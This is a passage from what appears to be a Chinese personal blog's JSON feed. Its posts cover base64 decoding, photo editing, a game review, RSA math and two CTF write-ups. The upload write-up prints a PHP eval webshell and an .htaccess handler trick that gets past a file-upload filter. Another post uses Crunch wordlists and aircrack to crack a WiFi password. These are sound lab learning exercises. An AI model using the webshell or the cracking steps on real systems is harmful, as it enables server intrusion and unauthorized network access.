class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>该鼠标指针来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnhlY2FkZXMueHl6L2FydGljbGVzL2N1cnNvci8=\"> Xecades</span></p>\n",
            "tags": [
                "wiki",
                "鼠标指针"
            ]
        },
        {
            "id": "http://kyrita.top/Python%E4%B8%ADtranslate-%E5%92%8Cmaketrans-%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "url": "http://kyrita.top/Python%E4%B8%ADtranslate-%E5%92%8Cmaketrans-%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "title": "Python中translate()和maketrans()的使用",
            "date_published": "2021-02-24T03:20:57.015Z",
            "content_html": "<p>base64 字典表顺序时可能会用到.<br />\n<a id=\"more\"></a><br />\npayload 如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>str1 <span class=\"token operator\">=</span> <span class=\"token string\">\"mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s1<span class=\"token operator\">=</span> <span class=\"token string\">\"AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s2<span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">.</span>translate<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>maketrans<span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">,</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>str1 是需要解码的 base64<br />\ns1 是给出的字典表，s2 是 s1 的（常规）映射表.<br />\n 下面简单讲解一下两种语法的使用.</p>\n<p><mark>maketrans()</mark><br />\n 生成字符串映射，即上述中 s2 是 s1 的映射表，也就是说 a 对应 B，B 对应 C，b 对应 D，以此类推...<br />\n<mark>translate()</mark><br />\n 这里对 str1 字符串使用这个 s1 与 s2 生成的映射关系，生成新的 base64</p>\n",
            "tags": [
                "wiki",
                "python",
                "python语法"
            ]
        },
        {
            "id": "http://kyrita.top/UPLOAD/",
            "url": "http://kyrita.top/UPLOAD/",
            "title": "UPLOAD",
            "date_published": "2021-02-21T13:05:00.061Z",
            "content_html": "<p>涉及到.htaccess<br />\n<a id=\"more\"></a><br />\n<img data-src=\"https://i.loli.net/2021/02/21/vU6IVNDxcr9YHbm.png\" alt=\"\" title=\"一目了然\" /><br />\n 就是要我们上传一句话木马</p>\n<h2 id=\"解题思路\"><a class=\"anchor\" href=\"#解题思路\">#</a> 解题思路</h2>\n<p>按照往常一样，我们先写一份 payload</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?php </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>@eval($_POST['attack']) ;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?></span></pre></td></tr></table></figure><p>将文本保存成 jpg 格式的图片，然后抓包上传。</p>\n<p><img data-src=\"https://i.loli.net/2021/02/21/nUXpQqmFbN9jGSe.png\" alt=\"\" /><br />\n将 filename 中的 jpg 格式改为 PHP，当作 php 文件解析。</p>\n<p><img data-src=\"https://i.loli.net/2021/02/21/9QhJTdr3z2FyCus.png\" alt=\"\" title=\"上传失败..\" /><br />\n祖安人骂了一半，但口水已经溅到脸上了。<br />\n接下来我改成 phtml,php1、2、3 都不管用；但是直接上传.jpg 是成功的，可问题是服务器并不会把 jpg 当作 php 来解析，这也告知了我们需要用别的文件来辅助上传。<br />\n迫不得已看了 WP，这里需要上传.htaccess 文件，原因是上传目录中没有本该存在的 php 文件。</p>\n<h3 id=\"这里先大致了解一下什么是htaccess\"><a class=\"anchor\" href=\"#这里先大致了解一下什么是htaccess\">#</a> 这里先大致了解一下什么是.htaccess</h3>\n<p>.htaccess 文件（分布式配置文件），提供了针对目录改变配置的方法，<span class=\"rainbow\">就是在一个特定的文件目录中放置一个包含多个指令的文件，以作用于此目录及其子目录。</span><br />\n作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 allowOverride 指令来设置。<br />\n<span class=\"purple\">.htaccess 文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有 root 权限的情况下。</span></p>\n<h2 id=\"handle\"><a class=\"anchor\" href=\"#handle\">#</a> Handle</h2>\n<p>在.htaccess 文件中写入</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>SetHandler application/x-httpd-php</pre></td></tr></table></figure><p><img data-src=\"https://i.loli.net/2021/02/21/gWwZJlPfoa3EpOr.png\" alt=\"\" title=\"更改Content-Type的类型为  image/jpeg\" /><br />\n之后放包</p>\n<p><img data-src=\"https://i.loli.net/2021/02/21/oxy4dLInORQwpW8.png\" alt=\"\" /><br />\n可以看到.htaccess 文件上传成功。</p>\n<p>接下来我们只需要将刚刚上传失败的一句话木马再上传一遍即可。<br />\n<img data-src=\"https://i.loli.net/2021/02/21/5c4lN8zYBUqTDmy.png\" alt=\"\" title=\"这里不需要改动什么了\" /><br />\n<img data-src=\"https://i.loli.net/2021/02/21/Pqz34WrG5hLTMAJ.png\" alt=\"\" title=\"木马也已经上传成功了\" /></p>\n<p>最后我们可以用菜刀链接服务器查看目录里藏着 flag 的文件了。</p>\n<p>菜刀连接，密码为 attack<br />\n<img data-src=\"https://i.loli.net/2021/02/21/tbCJB6ODKpyAZ5g.png\" alt=\"\" title=\"在根目录中发现flag\" /><br />\n 将它下载下来；<br />\n<img data-src=\"https://i.loli.net/2021/02/21/5oAvpyN2Pi4TlDF.png\" alt=\"\" title=\"得到flag\" /></p>\n<p>关于上传漏洞的知识点在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAzL2FydGljbGUvZGV0YWlscy8xMDQ4NTg3MDU/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLUJsb2dDb21tZW5kRnJvbU1hY2hpbmVMZWFyblBhaTItMi5jb250cm9sJmFtcDtkaXN0X3JlcXVlc3RfaWQ9ZDcwNmYwNTYtZjdhNS00NTMxLWEwNGUtYTRlMjk5MmQwMzZiJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy1CbG9nQ29tbWVuZEZyb21NYWNoaW5lTGVhcm5QYWkyLTIuY29udHJvbA==\">这篇博文</span>会有更详细的见解</p>\n",
            "tags": [
                "wp",
                "web",
                "上传漏洞"
            ]
        },
        {
            "id": "http://kyrita.top/%E5%91%90-%E7%B3%96%E6%9E%9C%E8%89%B2%E8%B0%83%E7%9A%84%E5%9B%BE%E7%89%87/",
            "url": "http://kyrita.top/%E5%91%90-%E7%B3%96%E6%9E%9C%E8%89%B2%E8%B0%83%E7%9A%84%E5%9B%BE%E7%89%87/",
            "title": "夏天就该喝糖果汽水才对嘛",
            "date_published": "2021-02-20T10:18:52.071Z",
            "content_html": "<p>好想要相机喔<br />\n<a id=\"more\"></a><br />\n 最近在微博上刷到许多大佬拍的 fine view，学生党暂时没钱买相机，于是就先在这里记录下学习如何后期处理吧。</p>\n<h2 id=\"澳大利亚摄影师-ben-thomas的摄影作品\"><a class=\"anchor\" href=\"#澳大利亚摄影师-ben-thomas的摄影作品\">#</a> 澳大利亚摄影师 Ben Thomas 的摄影作品</h2>\n<p><img data-src=\"https://i.loli.net/2021/02/20/NF1UvKaRSizG92m.jpg\" alt=\"\" title=\"通过后期调色，将照片的颜色调整为梦幻的糖果色;\" /></p>\n<h2 id=\"这张是我动手调整的别人的摄影作品\"><a class=\"anchor\" href=\"#这张是我动手调整的别人的摄影作品\">#</a> 这张是我动手调整的别人的摄影作品</h2>\n<p><img data-src=\"https://i.loli.net/2021/02/20/IRiyoOATrLCleVw.png\" alt=\"\" title=\"啊哈哈...可能雾霾感重了点喔\" /></p>\n<h3 id=\"how_done_it\"><a class=\"anchor\" href=\"#how_done_it\">#</a> How_Done_It</h3>\n<p>并不是所有的图片都适合糖果风，如果整个图中有很深的阴影 (阴影太多也很麻烦)，制作成糖果色要麻烦很多。于是我们可以选择拍一些晴天少云，颜色偏青并且建筑偏黄偏粉 (比如迪士尼)，画面中尽可能有比较规整的大面积色块。</p>\n<p>这里我们使用 Adobe Photoshop 打开图片<br />\n<img data-src=\"https://i.loli.net/2021/02/20/XfMUBSkZgP5wVN4.jpg\" alt=\"\" /></p>\n<p>因为图片本身暗部就比较少了，所以这里就不需要调亮了。<br />\n首先打开色阶，这里将黑场向右拖动让黑场变亮<br />\n<img data-src=\"https://i.loli.net/2021/02/20/OT712wVP3nlFYqs.png\" alt=\"\" /><br />\n其实就是让暗部在变亮一点；</p>\n<p>其次我们将灰场往左拖动，让图片整体变亮。<br />\n<img data-src=\"https://i.loli.net/2021/02/20/Brnb1gsi5dl7yup.png\" alt=\"\" /></p>\n<p>接下来调整色块的颜色。<br />\n这里我是用的色相饱和度调整；饱和度往往用于调整颜色的鲜艳程度，往右可以增加饱和度，往左可以降低饱和度。明度可以用于调整亮度。<br />\n需要对某一颜色进行调整时可以选择一种颜色进行参数变量；<br />\n先将天空的颜色调到偏青：<br />\n<img data-src=\"https://i.loli.net/2021/02/20/9TZXtnJjOBuaI6F.png\" alt=\"\" /><br />\n往左调整，将蓝色调到偏青色。</p>\n<p>先来看看效果如何<br />\n<img data-src=\"https://i.loli.net/2021/02/20/JgwrS92l84KIRvV.png\" alt=\"\" /></p>\n<p>之后，调整便利店的颜色，适当调亮就好啦。<br />\n<img data-src=\"https://i.loli.net/2021/02/20/PuKgrkS9TH8Z71Y.png\" alt=\"\" /><br />\n红色色块和黄色类似，这里忘记上了<br />\n<img data-src=\"https://i.loli.net/2021/02/20/TSFpKjG9w6uf7Dh.png\" alt=\"\" title=\"差不多就是这样啦\" /></p>\n<p>调色过程中可能会碰到部分区块变色，可以使用蒙版将无需变色的部分稍微涂抹一下。就目前颜色差不多达到预期的效果了，接下来可以调整对比度。<br />\n<img data-src=\"https://i.loli.net/2021/02/20/i7alYSsoqK4eJyD.png\" alt=\"\" /><br />\n将亮区往下拖一点，暗区适当增亮；<br />\n如果想要一些其他效果增强图片观感的话最后可以加一下锐化调整分辨率等其他操作，这里就不细说了；</p>\n<p>最后，糖果色的调整就完成啦<br />\n<img data-src=\"https://ae01.alicdn.com/kf/Ub3ebcfb84a1f48469547c6d577f0a4a6d.jpg\" alt=\"\" /></p>\n<p>调整糖果色并不困难，针对不同图像有不同的调法；</p>\n<p>参考：知乎</p>\n",
            "tags": [
                "摄影",
                "PS--色调"
            ]
        },
        {
            "id": "http://kyrita.top/Catherine/",
            "url": "http://kyrita.top/Catherine/",
            "title": "Catherine",
            "date_published": "2021-02-15T04:02:41.833Z",
            "content_html": "<p>32 岁还不结婚的男人，总有人希望你去死.<br />\n----《Catherine:remake》<br />\n<a id=\"more\"></a><br />\n 这是一部趣味十足的恋爱惊悚剧，如果你完全不知道这个游戏；那么我在这里放一点 pic, 相信你的多巴胺一定会作出很诚实的反应.</p>\n<p><img data-src=\"https://i.loli.net/2021/02/15/zHXevfh8gZxkLrD.jpg\" alt=\"\" /><br />\n<img data-src=\"https://i.loli.net/2021/02/15/uwNWoay5djJbe6K.jpg\" alt=\"\" /><br />\n<img data-src=\"https://i.loli.net/2021/02/15/nPrdQWOxfaM6R14.jpg\" alt=\"\" /><br />\n<img data-src=\"https://i.loli.net/2021/02/15/LKxDvelEIH4O7jZ.png\" alt=\"\" /><br />\n<img data-src=\"https://i.loli.net/2021/02/15/Jdy8LWDSg4bislx.jpg\" alt=\"\" /><br />\n<img data-src=\"https://i.loli.net/2021/02/15/zr2iMKbRjtQSX8P.png\" alt=\"\" /><br />\n<img data-src=\"https://i.loli.net/2021/02/15/b9hH4tf8XnFaSQo.jpg\" alt=\"\" /></p>\n<p>如果你和我一样是个自制力 (bingbu) 极强的男人，那么关于婚姻价值观讨论的问题也许会更让你感兴趣.</p>\n<h3 id=\"my-names-vinsent\"><a class=\"anchor\" href=\"#my-names-vinsent\">#</a> My Name's Vinsent</h3>\n<p>&quot;不想结婚的男人就该去死&quot; 曾经是《凯瑟琳》单人故事当中一个定则，这个献祭仪式持续了至少数百年之久.<br />\n 城郊的一隅，有一家叫做 &quot;迷途羔羊&quot; 的酒吧，店里没有禁烟席，除去披萨外没有什么正经的吃的，得益于店长不错的调酒水平，&quot;迷途的羔羊&quot; 还是吸引了不少客人。主角文森特就是其中的一只迷途羔羊。作为一名再就业的 system engineer, 工资不高不低，没有什么特殊技能，外貌平平无常，是个再不能普通的上班族.32 岁的他有一个交往了五年的女友凯瑟琳 (Katherine).<br />\n 谈了这么久的恋爱，就是生米也该煮成粥了。凯瑟琳一直在暗示文森特 &quot;到谈婚论嫁的时候了&quot;<br />\n<img data-src=\"https://i.loli.net/2021/02/15/iHk863GfRU4uj7y.png\" alt=\"\" /><br />\n 可文森特却被这突如其来的催婚而苦恼不已.<br />\n 并不是不爱凯瑟琳，文森特只是觉得现在正是为工作而奋斗的大好时光，结婚这等大事应该等到事业有成之后在忙也不急，而且作为男人，他并不希望自己过早地被家庭所束缚，好不容易在成年后脱离父母的掌控，好不容易能在 30 岁有了部分的职业自由，好不容易... 不容易换来的自由他不希望过早地寄托在凯瑟琳的手中，他爱她，但他也希望凯瑟琳能给他想要的空间感；<br />\n 疲惫了一天后，文森特来到可以吐露烦恼的地方 --&quot;迷途的羔羊&quot;.<br />\n 乔尼，和文森特一起长大的同学。成年后继承了老爹的修理厂，每天都带着小徒弟托比和哥们儿们一起喝酒。只想和还没遇到的 &quot;命中注定的另一半&quot; 结婚，和现在的女朋友没有之后的打算.<br />\n 奥兰德，三人组当中唯一早早结婚的一个，做生意失败后和老婆离婚，现在过着潇洒的单身生活，自称 &quot;婚姻就是墓场，我就是现成的例子&quot;.<br />\n 文森特将今天早上和凯瑟琳的谈话告诉了他们</p>\n<p><img data-src=\"https://i.loli.net/2021/02/15/pk2zVJH1UINueBh.png\" alt=\"\" /><br />\n他觉得自己不是讨厌凯瑟琳，只是畏惧婚姻.<br />\n 可是，婚姻这种事情，三个大男人怎么能商讨出结果呢...<br />\n 奥兰德将话题转移到了他的老同学，保罗身上.<br />\n&quot;喂，你知道吗？保罗那家伙... 今天早上死了啊！&quot;<br />\n<img data-src=\"https://i.loli.net/2021/02/15/SdjNhRZ3L2F4VtI.png\" alt=\"\" /><br />\n 事情发生地出奇就连警方也束手无策。人是在睡觉过程中死掉的，死状极其恐怖，全身如同缩水的纸片，弯曲狰狞.<br />\n 正当众人为此诧异时，文森特的手机响了.<br />\n<img data-src=\"https://i.loli.net/2021/02/15/PwGRTUqVXbgC8dx.png\" alt=\"\" /><br />\n 又是要自己赶紧结婚<br />\n...<br />\n...<br />\n 文森特已经无心继续在酒吧呆下去了.</p>\n<h3 id=\"my-names-catherine\"><a class=\"anchor\" href=\"#my-names-catherine\">#</a> My Name's Catherine</h3>\n<p><img data-src=\"https://i.loli.net/2021/02/15/3DzEZn1k5iRgrXS.png\" alt=\"\" /><br />\n文森特做了一个奇怪的梦：在梦里他和一堆绵羊人不停的往上爬，往上爬；脚下是披着婚纱的怪物追杀，以及靠两脚站立的 &quot;男性&quot; 绵羊的警告:&quot;往上爬，摔下去会死的！&quot;<br />\n 真的会死，文森特吓尿了；</p>\n<p>真的吓尿了，早晨起来文森特发现自己尿床了.<br />\n 与此同时，彻夜未关的电视正插播着 &quot;男性连续离奇死亡&quot; 的新闻。</p>\n<p>&quot;这是 ' 女人的诅咒 ' 哟&quot;<br />\n文森特想起昨晚路过的艾丽卡听到文森特他们的聊天，掺和进来:&quot; 受到女人诅咒的花心男和出轨男，会因为报应惨死在噩梦当中 &quot;<br />\n 小小的酒吧卡座，构成了《凯瑟琳》故事的中心，无论是熟悉的酒友还是陌生的过客，这些男人都是凯瑟琳 (Catherine) 游戏中一份子。对待婚姻的态度让他们夜夜在惊恐中搏命，醒来却又不得不面临着来自生活、工作、另一半的压力.<br />\n 文森特与凯瑟琳交往已经有五年了，十分清楚凯瑟琳是个好女人，知道他的咖啡总要加两块方糖，知道他每晚都会和老同学小聚，知道他 32 岁还偶尔尿床的毛病，自己也早就把余生另一半的位置交给了凯瑟琳.<br />\n 但是与桌前的要强的女人相比，文森特是完全相反的另一种人。他习惯按照自己的喜好换电脑换手机，习惯和单身哥们插科打诨的自由生活，习惯在单人床上醒来。所以，当 K 瑟琳一脸正经地说出 &quot;结婚后工资卡给我管理，夜间禁止外出，必须有计划花钱&quot; 等等之后，文森特开始畏惧起将来的生活.<br />\n 他知道自己应该结婚，但是他不敢结婚.</p>\n<p>这是第一次，文森特独自一人在酒吧喝着闷酒.<br />\n&quot;我可以坐在你前面吗？&quot; 一阵温柔又带着俏皮的女声在文森特耳畔响起.</p>\n<p>或许是无处安置的苦闷，文森特和面前这位才见面的金发女郎谈起了自己的烦心事.</p>\n<p><img data-src=\"https://i.loli.net/2021/02/15/JsgDdEO1VnFCyKX.png\" alt=\"\" /><br />\n无需墨守成规，生活即是及时行乐，不必为将来忧虑，着手于眼前.<br />\n 夹在现实婚姻和夺命噩梦之间动弹不得的文森特，在 stray sheep 遇到了凯瑟琳 (Catherine) 后这才发现，自己生理上对异性的喜好，其实与那个迟早都会结婚的女人完全相反.<br />\n<img data-src=\"https://i.loli.net/2021/02/15/yTE2sWFQaxduf6R.png\" alt=\"\" /><br />\n<img data-src=\"https://i.loli.net/2021/02/15/ZcIC4HPRLbF37Mm.png\" alt=\"\" /><br />\n 而眼前的这名凯瑟琳，无论是样貌还是个性，都是文森特梦寐以求的理想型.</p>\n<p>这一晚，文森特梦到了凯瑟琳像是一只披着婚纱的恶鬼追着他不放.</p>\n<p><img data-src=\"https://i.loli.net/2021/02/15/e5Mmt71AIaQsC4n.png\" alt=\"\" /><br />\n&quot;这一定是意外... 意外... 意外...&quot; 文森特不敢相信即将结婚的自己似乎外遇了。明明对凯瑟琳 (Katherine) 一心一意，却对眼前爱捣蛋的小恶魔无法释怀.</p>\n<p>外遇对男人来说只是一夜之萍水，对女人来说却会铭记一生.<br />\n<img data-src=\"https://i.loli.net/2021/02/15/3OHGhg7LWvuRx6U.png\" alt=\"\" /></p>\n<h3 id=\"你有点怪怪的\"><a class=\"anchor\" href=\"#你有点怪怪的\">#</a> 你有点怪怪的</h3>\n<p><img data-src=\"https://i.loli.net/2021/02/15/c63DX5inJf4QL7H.png\" alt=\"\" /><br />\n<mark>To be continued</mark></p>\n",
            "tags": [
                "生活随笔",
                "GAME",
                "凯瑟琳"
            ]
        },
        {
            "id": "http://kyrita.top/%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-Crunch%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/",
            "url": "http://kyrita.top/%E6%83%B3%E8%B9%AD%E7%BD%91%E5%85%88%E8%A7%A3%E5%BC%80%E5%AF%86%E7%A0%81-Crunch%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/",
            "title": "想蹭网先解开密码&Crunch密码生成器",
            "date_published": "2021-02-13T11:18:57.823Z",
            "content_html": "<p>Crunch 普遍用于生成密码字典，配合其他工具使用进行暴力破解。作为 kali linux 下前十名最常使用的工具之一，用途非常广泛。<br />\n<a id=\"more\"></a></p>\n<h3 id=\"-t-命令如下\"><a class=\"anchor\" href=\"#-t-命令如下\">#</a> -t 命令如下:</h3>\n<p>-t '@'/','/'%'/'<sup>', 指定模式，'@'/','/'%'/'</sup>' 分别代表意义如下:</p>\n<p>@ 插入小写字母<br />\n，插入大写字母<br />\n % 插入数字<br />\n ^ 插入特殊符号<br />\n使用实例：(当确定使用的对象类型但不具体知道是那些时可以使用占位符)<br />\n 例 1:<br />\n 生成缺位的手机号码 (有可能作为路由器密码或 wifi 密码（8-11 位）)<br />\n 命令：crunch 11 11   -t  1503453%%%%   -o 1.txt 或 &gt;&gt; 1.txt (以 % 位数字占位符)<br />\n 例 2:<br />\ncrunch 4 4  + + 123 + -t %%@^</p>\n<p>生成 4 位密码，其中格式为 &quot;两个数字&quot;+&quot;一个小写字母&quot;+&quot;常见符号&quot;(其中数字这里被指定只能为 123 组成的所有 2 位数字组合). 比如 12f#,32j^,13t$...etc..</p>\n<h3 id=\"crunch中常用的命令参数\"><a class=\"anchor\" href=\"#crunch中常用的命令参数\">#</a> Crunch 中常用的命令参数</h3>\n<p>-b ---&gt; 按大小分割字典文件，后接 20mib/mb/kb 等<br />\n - c ---&gt; 密码个数<br />\n - d ---&gt; 限制出现相同元素的个数 如 - d 3 代表不会出现 aabbbb 的情况<br />\n - e ---&gt; 定义停止生成密码 如 -e abcd 代表到 abcd 停止生成密码<br />\n - f ---&gt; 调用密码库文件 如 - f charset.lst mixalpha-numeric 代表调用密码库 charset.lst 中 mixalpha-numeric 项目字符<br />\n - i ---&gt; 改变输出格式<br />\n - t ---&gt; 定义输出格式<br />\n - l ---&gt; 与 - t 搭配使用<br />\n - p ---&gt; 定义密码组合元素<br />\n - m ---&gt; 与 - p 搭配使用<br />\n - o ---&gt; 保存为<br />\n - q ---&gt; 读取字典<br />\n - r ---&gt; 从某处重新开始<br />\n - s ---&gt; 第一个密码从 xxx 开始<br />\n - z ---&gt; 打包压缩 格式支持 gzip bzip2 lzma 7z</p>\n<h3 id=\"实验案例\"><a class=\"anchor\" href=\"#实验案例\">#</a> 实验案例</h3>\n<p><mark>1. 在终端下输入： crunch 1 4 abcd &gt;&gt;2.txt</mark><br />\n 意思是生成最小为 1, 最大为 4 的由 abcd 为元素的所有组合，结果导出为 2.txt</p>\n<p><mark>2. 在终端下输入 crunch 4 5 -p yale test</mark><br />\n 意思是生成以 &quot;yale&quot;&quot;test&quot; 为元素的所有密码组合</p>\n<p><mark>3. 在终端下输入 crunch 1 4 -o START -c 6000</mark><br />\n 意思是生成最小为 1 位，最大为 4 位元素为所有小写字母的密码字典的前 6000 个密码并预估所需时间</p>\n<p><mark>4. 在终端下输入 crunch 4 4 abcd + 1234 @#!* -t ^^%@</mark><br />\n意思是生成 4 位密码，格式为 &quot;字符 + 数字 + 字母&quot; 且字符范围是 @#!*, 数字范围是 1234, 字母范围是 abcd;</p>\n<p><mark>5. 当我们遇到字典文件过大时，我们需要把他们切分成几个文件，这时输入<br />\n crunch 3 4 -b 1mib -0 START</mark><br />\n 代表以 1M 进行分割</p>\n<p>了解完 Crunch 的大概内容后，我们可以开始着手本题了.</p>\n<h3 id=\"分析本题\"><a class=\"anchor\" href=\"#分析本题\">#</a> 分析本题</h3>\n<p>到手后是一份 cap, 打开流量分析一波没有发现 flag.<br />\n 根据 HINT 我们会发现这是一道 WiFi 密码破解，提示密码就是破解出的手机号，手机号已经给出前七位我们可以运用上面的 Crunch 命令破解；<br />\nlet's do it<br />\n<img data-src=\"https://i.loli.net/2021/02/14/zYeNb21r6WRC4cu.png\" alt=\"\" /><br />\n 写好 payload 后我们已经生成了字典接下来只需要运用好字典破解 cap 就可.</p>\n<p><img data-src=\"https://i.loli.net/2021/02/14/gT1qhHXPdAFOK43.png\" alt=\"\" /><br />\n采用 aircrack 破解密码，上面提示要我们输入一个数字，我填的 3; 别问，问就是我也不清楚.<br />\n<img data-src=\"https://i.loli.net/2021/02/14/oPwGITg1nh2EcqZ.png\" alt=\"\" /><br />\n 最后解出手机号</p>\n<p><span class=\"spoiler bulr\" title=\"快走开(╯▔皿▔)╯\">flag{13910407686}</span></p>\n",
            "tags": [
                "wp",
                "misc",
                "aircarck破解wifi密码(其一)"
            ]
        },
        {
            "id": "http://kyrita.top/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%B4/",
            "url": "http://kyrita.top/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%B4/",
            "title": "RSA加密算法详细解说",
            "date_published": "2021-02-08T08:04:48.652Z",
            "content_html": "<p>RSA 加密算法是一种非对称加密算法，加密由公钥，私钥，明文，密文四部分组成.<br />\n<a id=\"more\"></a></p>\n<h2 id=\"取模运算\"><a class=\"anchor\" href=\"#取模运算\">#</a> 取模运算</h2>\n<p>a mod n ≡ b 表示 a 与 b 对模 n 同余 (a,b 分别除以 n)</p>\n<div class=\"note info\">\n<p>举个栗子: 3 mod 2 ≡ 1 &lt;--&gt; 1mod2=1 且 3mod2=1</p>\n</div>\n<h2 id=\"欧拉函数\"><a class=\"anchor\" href=\"#欧拉函数\">#</a> 欧拉函数</h2>\n<p>任意给定正整数 n，计算在小于等于 n 的正整数之中，有多少个与 n 构成互质关系？计算这个值的方法就叫做欧拉函数，以 φ(n) 表示.</p>\n<div class=\"note info\">\n<p>例如，在 1 到 8 之中，与 8 形成互质关系的是 1、3、5、7，所以 φ(n)=4</p>\n</div>\n<h3 id=\"在rsa算法中欧拉函数对以下定理成立\"><a class=\"anchor\" href=\"#在rsa算法中欧拉函数对以下定理成立\">#</a> 在 RSA 算法中，欧拉函数对以下定理成立</h3>\n<p>1. 如果 n 可以分解成两个互质的整数之积，即 n=p×q，则有：φ(n)=φ(pq)=φ( p )φ( q );<br />\n2. 当 p 为质数，φ(p)=p-1</p>\n<p>所以有 φ(n)=(p-1)(q-1)</p>\n<h2 id=\"欧拉定理与模反元素\"><a class=\"anchor\" href=\"#欧拉定理与模反元素\">#</a> 欧拉定理与模反元素</h2>\n<p>欧拉函数的用处，在于欧拉定理<br />\n “欧拉定理” 指的是:<br />\n 如果两个正整数 a 和 n 互质，则 n 的欧拉函数 φ(n) 可以让下面的等式成立：<br />\na^φ(n)≡1(modn)<br />\n 也就是说，a 的 φ(n) 次方被 n 除的余数为 1</p>\n<h3 id=\"模反元素的推导过程如下\"><a class=\"anchor\" href=\"#模反元素的推导过程如下\">#</a> 模反元素的推导过程如下:</h3>\n<p>根据欧拉定理，有：<br />\na^φ(n) = a × a^(φ(n)−1)≡1(modn)</p>\n<p>令 b=a^(φ(n)−1)，得：</p>\n<p>ab≡1(modn)</p>\n<div class=\"note info\">\n<p>b 就是 a 的模反元素<br />\n所以，如果两个正整数 a 和 n 互质，那么一定可以找到整数 b 使得 ab-1 被 n 整除，或者说 ab 被 n 除的余数是 1</p>\n</div>\n<p><span class=\"green\">所以求私钥 d 的公式：d*e≡1mod [(p-1)(q-1)]</span></p>\n<h3 id=\"如何求d\"><a class=\"anchor\" href=\"#如何求d\">#</a> 如何求 d</h3>\n<p>例如我们定义 e 为 17,p=473398607161，q=4511491<br />\n 为了求出 d 我们写出如下脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 17x + 2135733082216268400y = 1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ext_euclid</span> <span class=\"token punctuation\">(</span> a <span class=\"token punctuation\">,</span> b <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> a</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        x <span class=\"token punctuation\">,</span> y <span class=\"token punctuation\">,</span> q <span class=\"token operator\">=</span> ext_euclid<span class=\"token punctuation\">(</span> b <span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        x <span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> y<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span> x <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">//</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> y <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> q</pre></td></tr><tr><td 